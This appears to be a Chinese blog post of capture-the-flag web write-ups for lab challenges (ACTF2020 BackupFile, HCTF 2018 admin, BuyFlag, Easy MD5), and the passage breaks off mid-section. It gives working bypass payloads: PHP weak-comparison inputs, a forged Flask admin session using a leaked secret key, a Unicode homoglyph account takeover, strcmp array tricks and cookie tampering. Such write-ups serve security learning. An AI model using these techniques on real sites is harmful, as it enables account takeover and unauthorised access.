&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;include_once&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt;;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;key&amp;#x27;&lt;/span&gt;])) &amp;#123;    &lt;span class=&#34;variable&#34;&gt;$key&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;key&amp;#x27;&lt;/span&gt;];    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!is_numeric(&lt;span class=&#34;variable&#34;&gt;$key&lt;/span&gt;)) &amp;#123;        &lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Just num!&amp;quot;&lt;/span&gt;);    &amp;#125;    &lt;span class=&#34;variable&#34;&gt;$key&lt;/span&gt; = intval(&lt;span class=&#34;variable&#34;&gt;$key&lt;/span&gt;);    &lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&amp;quot;&lt;/span&gt;;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$key&lt;/span&gt; == &lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt;) &amp;#123;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$flag&lt;/span&gt;;    &amp;#125;&amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;    &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Try to find out source file!&amp;quot;&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;分析 1️⃣下，get 传递参数 key&lt;/p&gt;
&lt;p&gt;key 通过 is_numeric 判断是否为数字，再通过 intval 获取变量 key 的整数值&lt;/p&gt;
&lt;p&gt;最后如果变量 key==“123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”，输出 flag&lt;/p&gt;
&lt;p&gt;ヾ (｡｀Д´｡) 干嘛干嘛呢这是，气人&lt;/p&gt;
&lt;p&gt;ლ(╹◡╹ლ) 好了，百度完回来了&lt;/p&gt;
&lt;p&gt;is_numeric ()，可以将字符串转换成 16 进制，绕过判断（经常造成 sql 注入）&lt;/p&gt;
&lt;p&gt;intval ()，获取变量的整数值，默认为十进制&lt;/p&gt;
&lt;p&gt;==，弱类型比较，当字符串和数字进行比较时，只提取字符串中开头的整数部分&lt;/p&gt;
&lt;p&gt;⭐然后突然发现 str 是以 123 开头，弱类型比较是等于 123 的&lt;/p&gt;
&lt;p&gt;好了 payload：?key=123，成功拿到 flag&lt;/p&gt;
&lt;p&gt;…(＿ ＿) ノ｜壁&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;actf2020-新生赛-backupfile1-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#actf2020-新生赛-backupfile1-2&#34;&gt;#&lt;/a&gt; ACTF2020 新生赛 BackupFile1&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;关键词：is_numeric () 绕过，== 绕过，php 弱类型比较表&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;看题，找备份文件，index.php.bak&lt;/p&gt;
&lt;p&gt;🐴index.php 代码如下：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;include_once&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt;;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;key&amp;#x27;&lt;/span&gt;])) &amp;#123;    &lt;span class=&#34;variable&#34;&gt;$key&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;key&amp;#x27;&lt;/span&gt;];    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!is_numeric(&lt;span class=&#34;variable&#34;&gt;$key&lt;/span&gt;)) &amp;#123;        &lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Just num!&amp;quot;&lt;/span&gt;);    &amp;#125;    &lt;span class=&#34;variable&#34;&gt;$key&lt;/span&gt; = intval(&lt;span class=&#34;variable&#34;&gt;$key&lt;/span&gt;);    &lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&amp;quot;&lt;/span&gt;;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$key&lt;/span&gt; == &lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt;) &amp;#123;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$flag&lt;/span&gt;;    &amp;#125;&amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;    &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Try to find out source file!&amp;quot;&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;分析 1️⃣下，get 传递参数 key&lt;/p&gt;
&lt;p&gt;key 通过 is_numeric 判断是否为数字，再通过 intval 获取变量 key 的整数值&lt;/p&gt;
&lt;p&gt;最后如果变量 key==“123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”，输出 flag&lt;/p&gt;
&lt;p&gt;ヾ (｡｀Д´｡) 干嘛干嘛呢这是，气人&lt;/p&gt;
&lt;p&gt;ლ(╹◡╹ლ) 好了，百度完回来了&lt;/p&gt;
&lt;p&gt;is_numeric ()，可以将字符串转换成 16 进制，绕过判断（经常造成 sql 注入）&lt;/p&gt;
&lt;p&gt;intval ()，获取变量的整数值，默认为十进制&lt;/p&gt;
&lt;p&gt;==，弱类型比较，当字符串和数字进行比较时，只提取字符串中开头的整数部分&lt;/p&gt;
&lt;p&gt;⭐然后突然发现 str 是以 123 开头，弱类型比较是等于 123 的&lt;/p&gt;
&lt;p&gt;好了 payload：?key=123，成功拿到 flag&lt;/p&gt;
&lt;p&gt;…(＿ ＿) ノ｜壁&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;hctf-2018-admin1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hctf-2018-admin1&#34;&gt;#&lt;/a&gt; HCTF 2018 admin1&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;关键字：flask，session 伪造，unicode 欺骗&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;🦋登录和注册界面，看题 admin&lt;/p&gt;
&lt;p&gt;输入 admin/admin 登录失败&lt;/p&gt;
&lt;p&gt;注册 admin/admin 该账户已被注册&lt;/p&gt;
&lt;p&gt;🦋爆破⑧行，试了几个弱口令，我觉得留一个注册页面应该是用来注册的&lt;/p&gt;
&lt;p&gt;注册 admin123/admin123（弱口令老玩家٩◔̯◔۶ ）&lt;/p&gt;
&lt;p&gt;登录后回显（测了一遍并没有什么用）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;buuctf-web5.png&#34; style=&#34;zoom:40%;&#34; /&gt;&lt;img src=&#34;buuctf-web6.png&#34; style=&#34;zoom:40%;&#34; /&gt;&lt;/p&gt;
&lt;img src=&#34;buuctf-web4.png&#34; style=&#34;zoom:22%;&#34; /&gt;
&lt;p&gt;🦋在 changepassword 中有一行被注释掉的提示信息&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;&amp;lt;!-- https://github.com/woadsl1234/hctf_flask/ --&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;flask 是一个微型的 python 开发的 web 框架&lt;/p&gt;
&lt;p&gt;然后发现是题目源码，但是.sql 文件中存储的 admin 密码是 hash 加密过的&lt;/p&gt;
&lt;p&gt;🎀对不起我只能想到构造 admin 的 session 登录 session 用户了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;buuctf-web7.gif&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;给当前登录用户的 session 解密如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;buuctf-web7.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到当前登录用户是 admin123 辣&lt;/p&gt;
&lt;p&gt;index.html 界面会回显用户账户名，目测是根据 session 中的 name 回显的，查看源代码中的 index.html 文件：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% include(&lt;span class=&#34;string&#34;&gt;&amp;#x27;header.html&amp;#x27;&lt;/span&gt;) %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; current_user.is_authenticated %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;h1 &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt;=&amp;quot;&lt;span class=&#34;title&#34;&gt;nav&lt;/span&gt;&amp;quot;&amp;gt;&lt;span class=&#34;title&#34;&gt;Hello&lt;/span&gt; &amp;#123;&amp;#123; &lt;span class=&#34;title&#34;&gt;session&lt;/span&gt;[&amp;#x27;&lt;span class=&#34;title&#34;&gt;name&lt;/span&gt;&amp;#x27;] &amp;#125;&amp;#125;&amp;lt;/&lt;span class=&#34;title&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&amp;#123;% &lt;span class=&#34;title&#34;&gt;endif&lt;/span&gt; %&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&amp;#123;% &lt;span class=&#34;title&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;current_user&lt;/span&gt;.&lt;span class=&#34;title&#34;&gt;is_authenticated&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;session&lt;/span&gt;[&amp;#x27;&lt;span class=&#34;title&#34;&gt;name&lt;/span&gt;&amp;#x27;] == &amp;#x27;&lt;span class=&#34;title&#34;&gt;admin&lt;/span&gt;&amp;#x27; %&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&amp;lt;&lt;span class=&#34;title&#34;&gt;h1&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;class&lt;/span&gt;=&amp;quot;&lt;span class=&#34;title&#34;&gt;nav&lt;/span&gt;&amp;quot;&amp;gt;&lt;span class=&#34;title&#34;&gt;hctf&lt;/span&gt;&amp;#123;&lt;span class=&#34;title&#34;&gt;xxxxxxxxx&lt;/span&gt;&amp;#125;&amp;lt;/&lt;span class=&#34;title&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&amp;#123;% &lt;span class=&#34;title&#34;&gt;endif&lt;/span&gt; %&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&amp;lt;!-- &lt;span class=&#34;title&#34;&gt;you&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;are&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;admin&lt;/span&gt; --&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&amp;lt;h1 &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt;=&amp;quot;nav&amp;quot;&amp;gt;Welcome to hctf&amp;lt;/h1&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&amp;#123;% include(&amp;#x27;footer.html&amp;#x27;) %&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p xxxxxxxxx=&#34;&#34;&gt;当 session 中的 name=admin 时，会输出 flaghctf&lt;/p&gt;
&lt;p&gt;但是 flask session 加密需要秘钥，在 config.py 中找到 SECRET_KEY=os.environ.get (‘SECRET_KEY’) or ‘ckj123’&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;buuctf-web11.png&#34; alt=&#34;buuctf-web11&#34;&gt;&lt;/p&gt;
&lt;p&gt;利用&lt;a href=&#34;https://github.com/noraj/flask-session-cookie-manager&#34;&gt; flask_session 加解密工具&lt;/a&gt;进行 session 加解密&lt;/p&gt;
&lt;p&gt;将以下数据加密&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#x27;_fresh&amp;#x27;: True, &amp;#x27;_id&amp;#x27;: b&amp;#x27;22ef025f1846ed290c3abc33091af4789157e04648638256aa7b8d41e4e27adfa91e24e72c43d5d81353bd327192646b54ca6b77e66626aab5f3d7521feba4ef&amp;#x27;, &amp;#x27;csrf_token&amp;#x27;: b&amp;#x27;62c673754392025e9b7ce0ec4fe937415e76df71&amp;#x27;, &amp;#x27;image&amp;#x27;: b&amp;#x27;wlBG&amp;#x27;, &amp;#x27;name&amp;#x27;: &amp;#x27;admin&amp;#x27;, &amp;#x27;user_id&amp;#x27;: &amp;#x27;10&amp;#x27;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;buuctf-web8.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;拿到 flag，好耶ヾ (✿ﾟ▽ﾟ) ノ&lt;/p&gt;
&lt;p&gt;🎀再来撸一下&lt;a href=&#34;http://xdxd.love/2016/10/17/unicode%E5%90%8C%E5%BD%A2%E5%AD%97%E5%BC%95%E8%B5%B7%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/&#34;&gt; unicode 同形字引起的安全问题&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在这里 &lt;code&gt;Twisted库的版本是10.0.0&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;nodeprep.prepare () 函数，第一次调用：会把其他类的编码转为 ascii 码，第二次调用：内容转为小写&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ᴬᴰᴹᴵᴺ —&amp;gt; ADMIN —&amp;gt; admin&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;a href=&#34;http://xn--rutes-ck2hx70mgflissmgc.py&#34;&gt;查看源代码 rutes.py&lt;/a&gt;，自定义一个转小写函数：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;strlower&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;username&lt;/span&gt;):&lt;/span&gt;    username = nodeprep.prepare(username)    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; username&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在三个功能点处都调用过一次该函数：register、login、change&lt;/p&gt;
&lt;p&gt;在登录时，会调用 strlower ()，将ᴬᴰᴹᴵᴺ 转成 ADMIN，存储在 session 中&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; request.method == &lt;span class=&#34;string&#34;&gt;&amp;#x27;POST&amp;#x27;&lt;/span&gt;:        name = strlower(form.username.data)        session[&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;] = name&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因此，我们注册一个账户名为ᴬᴰᴹᴵᴺ的用户，登录后欢迎界面会显示 ADMIN&lt;/p&gt;
&lt;img src=&#34;buuctf-web9.png&#34; style=&#34;zoom:50%;&#34; /&gt;
&lt;p&gt;修改密码时，同样会再次调用 strlower ()，将 ADMIN 转成 admin，存储在 session 中&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; request.method == &lt;span class=&#34;string&#34;&gt;&amp;#x27;POST&amp;#x27;&lt;/span&gt;:        name = strlower(session[&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;])        user = User.query.filter_by(username=name).first()        user.set_password(form.newpassword.data)        db.session.commit()        flash(&lt;span class=&#34;string&#34;&gt;&amp;#x27;change successful&amp;#x27;&lt;/span&gt;)        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; redirect(url_for(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因此此时我们修改的密码为 admin 的密码&lt;/p&gt;
&lt;p&gt;然后嚯嚯嚯拿到 flag ヾ (･ω･`｡)&lt;/p&gt;
&lt;p&gt;🎀大失败&lt;/p&gt;
&lt;p&gt;因为登录时，是先写入 session，再判断该账户是否登录成功&lt;/p&gt;
&lt;p&gt;改密码时，需要获取 session，再进行密码修改&lt;/p&gt;
&lt;p&gt;因此在登录写入 session 之后，判断用户是否登录成功销毁 session 之前，此时修改密码，就可以成功修改登录用户的密码&lt;/p&gt;
&lt;p&gt;但是我没有看见 login 处登录失败时，会销毁 session&lt;/p&gt;
&lt;p&gt;🐴所以先在火狐上登录一个随便注册的账号，打开更改密码界面&lt;/p&gt;
&lt;p&gt;🐴再在谷歌上登录 admin 账号（随便输入密码）&lt;/p&gt;
&lt;p&gt;🐴最后修改密码&lt;/p&gt;
&lt;p&gt;用修改的密码登录 admin 账号失败&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;参考链接：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_44677409/article/details/100733581&#34;&gt;此题三种解法&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.jianshu.com/p/278d4f59839d&#34;&gt;flask session&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://chenlvtang.github.io/2020/05/14/Unicode%E5%B0%8F%E9%AA%97%E5%AD%90/#%E4%B8%BE%E4%B8%AA%F0%9F%8C%B0-HCTF2018-admin&#34;&gt;Unicode 小骗子&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;php 弱类型比较表&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;buuctf-web10.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;极客大挑战-2019-buyflag&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#极客大挑战-2019-buyflag&#34;&gt;#&lt;/a&gt; 极客大挑战 2019 BuyFlag&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;关键词：php、strcmp () 绕过&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;🎀查看 pay.php 源码，发现提示&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;~~~post money &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; password~~~&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (is_numeric(&lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;password can&amp;#x27;t be number&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;			&amp;#125;&lt;span class=&#34;keyword&#34;&gt;elseif&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt; == &lt;span class=&#34;number&#34;&gt;404&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Password Right!&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;password 弱比较，password=404a&lt;/p&gt;
&lt;p&gt;🎀根据 Flag need your 100000000 money，可以使用科学计数法 1e9，也可以通过&lt;a href=&#34;https://blog.csdn.net/cherrie007/article/details/77473817&#34;&gt; strcmp 漏洞&lt;/a&gt;，进行绕过&lt;/p&gt;
&lt;p&gt;money []=a 或者 money=1e9 都可以&lt;/p&gt;
&lt;p&gt;🎀根据 You must be a student from CUIT，大概率是在 cookie 处验证身份信息&lt;/p&gt;
&lt;p&gt;发现 cookie 处有一个 user=0，改成 user=1 即可通过验证&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;bjdctf2020-easy-md5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bjdctf2020-easy-md5&#34;&gt;#&lt;/a&gt; BJDCTF2020 Easy MD5&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;关键词：php、md5 () 绕过&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;抓包看见响应包中的提示&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Hint: select * from &amp;#x27;admin&amp;#x27; where password=md5($pass,true)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;看题如果正常 md5 加密 pass 这个逻辑，肯定注不进去哇&lt;/p&gt;
&lt;p&gt;辣就去找关于 md5 () 这个函数的漏洞&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;语法：md5 (string,raw)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;string&lt;/strong&gt;: 所需加密的字符串&lt;/p&gt;
